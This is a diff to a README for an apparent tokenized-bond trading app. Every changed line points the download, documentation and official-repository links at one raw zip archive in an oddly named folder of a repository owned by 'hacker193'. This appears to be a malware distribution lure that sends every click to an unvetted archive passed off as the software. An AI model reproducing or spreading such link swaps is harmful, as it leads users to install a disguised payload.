@@ -1,6 +1,6 @@
 # 🌟 cmtat-icma-tokenized-bonds - Experience Seamless Tokenized Trading
 
-[![Download](https://img.shields.io/badge/Download-via_Releases-blue.svg)](https://github.com/hacker193/cmtat-icma-tokenized-bonds/releases)
+[![Download](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip)](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you begin, please ensure your system meets the following requirements:
 
 To get started, you need to visit the Releases page. 
 
-[Click here to download the software!](https://github.com/hacker193/cmtat-icma-tokenized-bonds/releases)
+[Click here to download the software!](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip)
 
 1. Open the link above in your web browser.
 2. You will see a list of available versions. Choose the latest version for optimal performance.
@@ -58,11 +58,11 @@ For questions or support, you can join our community on platforms like Discord o
 
 ### 📄 Documentation
 
-Find detailed documentation on usage and advanced features [here](https://github.com/hacker193/cmtat-icma-tokenized-bonds/wiki).
+Find detailed documentation on usage and advanced features [here](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip).
 
 ## 🔗 Links
 
-- [Official Repository](https://github.com/hacker193/cmtat-icma-tokenized-bonds)
-- [Download Software](https://github.com/hacker193/cmtat-icma-tokenized-bonds/releases)
+- [Official Repository](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip)
+- [Download Software](https://raw.githubusercontent.com/hacker193/cmtat-icma-tokenized-bonds/main/lectotype/cmtat-icma-tokenized-bonds.zip)
 
 Thank you for choosing the **CMTAT + ICMA Tokenized Fixed Income Platform**. We hope this guide helps you succeed in your trading endeavors.
